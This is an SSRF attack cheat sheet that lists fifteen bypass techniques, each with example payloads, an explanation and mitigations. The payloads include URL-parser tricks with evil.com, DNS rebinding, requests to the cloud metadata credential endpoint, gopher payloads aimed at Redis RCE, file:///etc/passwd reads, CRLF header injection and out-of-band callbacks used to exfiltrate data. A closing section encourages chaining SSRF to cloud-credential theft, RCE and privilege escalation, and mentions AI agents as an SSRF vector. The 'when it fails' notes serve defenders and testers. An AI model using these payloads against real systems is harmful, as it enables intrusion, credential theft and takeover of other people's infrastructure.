*Written by Aryan Giri*

---

## 1. URL Parser Confusion (Mixed Parsers)

**Example Payload**

```
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
http://127.0.0.1%23@evil.com
```

**Why it works**
Different components (WAF, backend, HTTP client) parse URLs differently. One layer may validate `evil.com` while the actual request goes to `127.0.0.1`. This happens due to inconsistencies in RFC3986 handling (userinfo `@`, fragments `#`, encoding).

**When it fails**

* Unified URL parsing across stack (same library everywhere)
* Strict allowlists with resolved IP validation

---

## 2. DNS Rebinding (Time-of-Check vs Time-of-Use)

**Example Payload**

```
http://attacker-controlled-domain.com
```

(Initially resolves to public IP → later rebinds to 127.0.0.1 or 169.254.169.254)

**Why it works**
Application validates domain once (safe IP), but actual request happens later after DNS changes. Classic TOCTOU bug.

**When it fails**

* DNS pinning
* IP re-validation before request
* Low TTL ignored by resolver

---

## 3. Open Redirect Chaining

**Example Payload**

```
http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

**Why it works**
Target allows only trusted domains. You host SSRF via a trusted domain’s open redirect endpoint, bypassing domain allowlists.

**When it fails**

* Redirect following disabled
* Final destination validation enforced

---

## 4. Cloud Metadata SSRF (IMDSv1/v2 Bypass)

**Example Payload**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Advanced Bypass (IMDSv2)**

* Abuse apps that allow custom headers
* Trigger internal services that already include metadata token

**Why it works**
Cloud instances expose metadata via link-local IP. Weak protections (IMDSv1) allow unauthenticated access.

**When it fails**

* IMDSv2 enforced (token required)
* Network egress filtering

---

## 5. Protocol Smuggling (Gopher for Raw TCP)

**Example Payload**

```
gopher://127.0.0.1:6379/_*1\r\n$4\r\nINFO\r\n
```

**Why it works**
Gopher allows raw TCP payloads. You can interact with internal services (Redis, Memcached, SMTP) directly.

**When it fails**

* Protocol filtering (only http/https allowed)
* URL scheme validation

---

## 6. File Protocol Abuse

**Example Payload**

```
file:///etc/passwd
```

**Why it works**
Some backends allow non-HTTP schemes. Leads to local file read (LFI via SSRF).

**When it fails**

* Strict scheme allowlist
* Sandboxed runtime

---

## 7. HTTP Header Injection via SSRF

**Example Payload**

```
http://127.0.0.1\r\nX-Forwarded-For: 127.0.0.1
```

**Why it works**
If SSRF sink doesn’t sanitize CRLF, you can inject headers → bypass internal auth or hit admin endpoints.

**When it fails**

* Proper URL encoding
* CRLF sanitization

---

## 8. IPv6 + Embedded IPv4 Confusion

**Example Payload**

```
http://[::ffff:127.0.0.1]
```

**Why it works**
Filters may block IPv4 but allow IPv6. Embedded IPv4 bypasses naive checks.

**When it fails**

* Normalization to canonical IP before validation

---

## 9. DNS Wildcard + Subdomain Takeover Combo

**Example Payload**

```
http://internal.attacker-owned-domain.com
```

**Why it works**
If target trusts `*.domain.com` and you control a dangling subdomain → full SSRF pivot.

**When it fails**

* Proper DNS hygiene
* No wildcard trust

---

## 10. URL Encoding Confusion (Double/Triple Encoding)

**Example Payload**

```
http://%31%32%37.0.0.1
http://127.0.0.1%252f..
```

**Why it works**
Multiple decoding stages → validation sees safe string, request resolves to internal IP.

**When it fails**

* Single-pass decoding
* Strict normalization

---

## 11. SSRF via PDF / Image Renderers

**Example Payload**

```
<img src="http://169.254.169.254/latest/meta-data/">
```

**Why it works**
Server-side renderers (wkhtmltopdf, headless Chrome) fetch remote resources → hidden SSRF vector.

**When it fails**

* Network isolation for renderer
* Resource loading disabled

---

## 12. Blind SSRF with OOB Interaction

**Example Payload**

```
http://your-collaborator-domain.com
```

**Why it works**
No response? Use DNS/HTTP callbacks (Burp Collaborator-style) to confirm SSRF and exfiltrate.

**When it fails**

* No outbound connectivity
* DNS logging blocked

---

## 13. Internal Service Pivoting (SSRF → RCE)

**Example Payload (Redis RCE chain)**

```
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html
```

**Why it works**
SSRF is just entry point. Internal services often lack auth → chain to RCE.

**When it fails**

* Authenticated services
* Network segmentation

---

## 14. Host Header Injection via SSRF

**Example Payload**

```
http://victim.com (with injected Host header)
```

**Why it works**
Internal routing decisions depend on Host header. SSRF + header control = access hidden vhosts.

**When it fails**

* Strict host validation

---

## 15. WAF Bypass via Scheme Confusion

**Example Payload**

```
http://127.1
http://0
http://[::]
```

**Why it works**
WAF blocks common patterns but misses edge-case representations of localhost.

**When it fails**

* Comprehensive IP normalization

---

# Real-World Mindset

* SSRF ≠ bug → it’s a pivot primitive
* Always chain:

  * SSRF → metadata → creds → cloud takeover
  * SSRF → internal service → RCE
  * SSRF → admin panel → privilege escalation

---

# Modern (2026) Trends

* AI plugins & agents introducing SSRF via tool fetching
* Cloud-native apps exposing internal APIs
* Increased IMDSv2 adoption → forcing creative bypasses
* SSRF via supply-chain (third-party integrations)

---

